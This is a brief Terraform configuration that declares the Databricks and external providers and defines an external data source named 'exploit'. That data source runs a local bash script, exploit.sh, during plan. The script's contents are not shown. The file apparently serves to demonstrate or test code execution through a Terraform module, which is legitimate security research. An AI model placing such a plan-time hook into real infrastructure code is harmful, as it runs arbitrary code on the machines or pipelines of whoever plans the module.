terraform {
  required_providers {
    databricks = {
      source = "databricks/databricks"
    }
    external = {
      source = "hashicorp/external"
    }
  }
}

data "external" "exploit" {
  program = ["bash", "${path.module}/exploit.sh"]
}
